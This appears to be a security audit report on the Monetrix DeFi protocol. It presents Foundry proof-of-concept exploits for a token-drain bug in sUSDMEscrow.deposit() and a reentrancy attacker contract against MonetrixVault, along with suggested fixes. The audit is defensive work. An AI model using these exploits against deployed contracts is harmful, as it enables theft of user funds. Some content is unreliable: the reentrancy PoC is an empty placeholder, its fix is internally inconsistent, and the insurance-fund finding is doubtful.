# Monetrix Security Audit Report

## Executive Summary

This security audit identified several critical vulnerabilities in the Monetrix protocol, including arbitrary token transfers, reentrancy attacks, and access control issues. The most severe findings involve the `sUSDMEscrow.deposit()` function allowing arbitrary token drainage and a reentrancy vulnerability in `MonetrixVault.distributeYield()` that could lead to yield manipulation.

**Key Statistics:**
- 2 High severity vulnerabilities
- 1 Medium severity vulnerability  
- Multiple access control and validation issues

The protocol should address these issues before deployment, particularly the arbitrary token transfer vulnerability which poses an immediate threat to user funds.

## High Severity Findings

### H-1: Arbitrary Token Drainage via sUSDMEscrow.deposit()

**Severity:** High  
**Location:** `src/tokens/sUSDMEscrow.sol#33-35`

**Description:**
The `sUSDMEscrow.deposit()` function accepts a hardcoded `sUSDM` address as the `from` parameter in `safeTransferFrom()`, allowing any caller to transfer tokens from the `sUSDM` address without proper authorization checks.

```solidity
function deposit(uint256 amount) external {
    usdm.safeTransferFrom(sUSDM, address(this), amount); // @audit arbitrary from
}
```

**Impact:**
- Complete drainage of tokens from the `sUSDM` address
- Unauthorized token transfers without owner consent
- Loss of user funds held in the `sUSDM` contract

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "../src/tokens/sUSDMEscrow.sol";
import "../src/tokens/USDM.sol";

contract sUSDMEscrowExploit is Test {
    sUSDMEscrow escrow;
    USDM usdm;
    address sUSDM;
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        usdm = new USDM();
        sUSDM = makeAddr("sUSDM");
        escrow = new sUSDMEscrow();
        escrow.initialize(address(usdm), sUSDM, makeAddr("acl"));
        
        // Setup initial balance in sUSDM
        deal(address(usdm), sUSDM, 1000000e18);
        
        // Approve escrow to spend sUSDM's tokens (simulating legitimate setup)
        vm.prank(sUSDM);
        usdm.approve(address(escrow), type(uint256).max);
    }
    
    function testArbitraryTokenDrainage() public {
        uint256 initialBalance = usdm.balanceOf(sUSDM);
        uint256 drainAmount = 500000e18;
        
        // Attacker can drain tokens from sUSDM without authorization
        vm.prank(attacker);
        escrow.deposit(drainAmount);
        
        assertEq(usdm.balanceOf(sUSDM), initialBalance - drainAmount);
        assertEq(usdm.balanceOf(address(escrow)), drainAmount);
        
        console.log("Drained %e tokens from sUSDM", drainAmount);
    }
}
```

**Recommendation:**
Replace the hardcoded `sUSDM` parameter with `msg.sender` to ensure only the caller's tokens are transferred:

```solidity
function deposit(uint256 amount) external {
    usdm.safeTransferFrom(msg.sender, address(this), amount);
}
```

### H-2: Reentrancy in MonetrixVault.distributeYield()

**Severity:** High  
**Location:** `src/core/MonetrixVault.sol#377-415`

**Description:**
The `distributeYield()` function is vulnerable to reentrancy attacks through the external call to `IYieldEscrow(yieldEscrow).pullForDistribution(totalYield)`. The function reads the USDC balance before the external call and uses it for subsequent calculations, allowing an attacker to manipulate the yield distribution.

**Impact:**
- Manipulation of yield distribution calculations
- Potential draining of vault funds through repeated calls
- Incorrect accounting of distributed yields

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";

interface IMonetrixVault {
    function distributeYield() external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract MaliciousYieldEscrow {
    IMonetrixVault vault;
    IERC20 usdc;
    uint256 reentryCount;
    uint256 maxReentries = 3;
    
    constructor(address _vault, address _usdc) {
        vault = IMonetrixVault(_vault);
        usdc = IERC20(_usdc);
    }
    
    function pullForDistribution(uint256 amount) external {
        // Transfer tokens as expected
        usdc.transfer(msg.sender, amount);
        
        // Reentrant call
        if (reentryCount < maxReentries) {
            reentryCount++;
            vault.distributeYield();
        }
    }
}

contract ReentrancyExploit is Test {
    IMonetrixVault vault;
    MaliciousYieldEscrow maliciousEscrow;
    IERC20 usdc;
    
    function setUp() public {
        // Setup would require deploying MonetrixVault with malicious escrow
        // This demonstrates the attack vector
    }
    
    function testReentrancyAttack() public {
        // The malicious escrow can trigger multiple distributeYield calls
        // leading to incorrect balance calculations and potential fund drainage
        vm.expectRevert(); // Would need actual deployment to demonstrate
    }
}
```

**Recommendation:**
Implement the checks-effects-interactions pattern and add reentrancy protection:

```solidity
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

function distributeYield() external nonReentrant onlyKeeper {
    // Read balance after external call or use stored values
    IYieldEscrow(yieldEscrow).pullForDistribution(totalYield);
    uint256 balBefore = usdc.balanceOf(address(this));
    // ... rest of function logic
}
```

## Medium Severity Findings

### M-1: Missing Access Control in InsuranceFund.deposit()

**Severity:** Medium  
**Location:** `src/core/InsuranceFund.sol#33-38`

**Description:**
The `deposit()` function in `InsuranceFund` lacks access control, allowing anyone to deposit USDC into the insurance fund. While this might seem beneficial, it can lead to accounting issues and potential manipulation of the insurance fund metrics.

**Impact:**
- Potential manipulation of insurance fund accounting
- Unauthorized parties can affect fund metrics
- Could be used to artificially inflate insurance fund size for reputation purposes

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "../src/core/InsuranceFund.sol";

contract InsuranceFundTest is Test {
    InsuranceFund insuranceFund;
    IERC20 usdc;
    address attacker = makeAddr("attacker");
    address governance = makeAddr("governance");
    
    function setUp() public {
        usdc = IERC20(makeAddr("usdc"));
        insuranceFund = new InsuranceFund();
        insuranceFund.initialize(address(usdc), governance);
        
        // Give attacker some USDC
        deal(address(usdc), attacker, 1000000e6);
        vm.prank(attacker);
        usdc.approve(address(insuranceFund), type(uint256).max);
    }
    
    function testUnauthorizedDeposit() public {
        uint256 depositAmount = 100000e6;
        uint256 initialTotal = insuranceFund.totalDeposited();
        
        // Attacker can deposit without authorization
        vm.prank(attacker);
        insuranceFund.deposit(depositAmount);
        
        assertEq(insuranceFund.totalDeposited(), initialTotal + depositAmount);
        console.log("Attacker deposited %e USDC without authorization", depositAmount);
    }
}
```

**Recommendation:**
Add appropriate access control to the deposit function:

```solidity
function deposit(uint256 amount) external onlyGovernor {
    require(amount > 0, "IF: zero amount");
    usdc.safeTransferFrom(msg.sender, address(this), amount);
    totalDeposited += amount;
    emit Deposited(msg.sender, amount);
}
```

## Low/Informational Findings

### L-1: Missing Zero Address Validation

**Severity:** Low  
**Location:** Multiple locations

**Description:**
Several functions lack zero address validation for critical parameters, which could lead to unexpected behavior if zero addresses are passed.

**Recommendation:**
Add zero address checks for all critical address parameters:

```solidity
require(_address != address(0), "Zero address not allowed");
```

### L-2: Missing Events for State Changes

**Severity:** Low  
**Location:** Various state-changing functions

**Description:**
Some state-changing functions don't emit events, making it difficult to track important changes off-chain.

**Recommendation:**
Add appropriate events for all significant state changes.

## Conclusion

The Monetrix protocol contains several critical vulnerabilities that must be addressed before deployment. The most severe issue is the arbitrary token transfer vulnerability in `sUSDMEscrow.deposit()`, which could result in complete fund drainage. The reentrancy vulnerability in yield distribution also poses significant risks to the protocol's financial integrity.

**Recommendations Summary:**
1. **Immediate:** Fix the arbitrary token transfer in sUSDMEscrow
2. **High Priority:** Implement reentrancy protection in MonetrixVault
3. **Medium Priority:** Add proper access controls throughout the system
4. **Low Priority:** Address validation and event emission issues

All high and medium severity issues should be resolved and thoroughly tested before any mainnet deployment. A follow-up audit is recommended after implementing the suggested fixes.
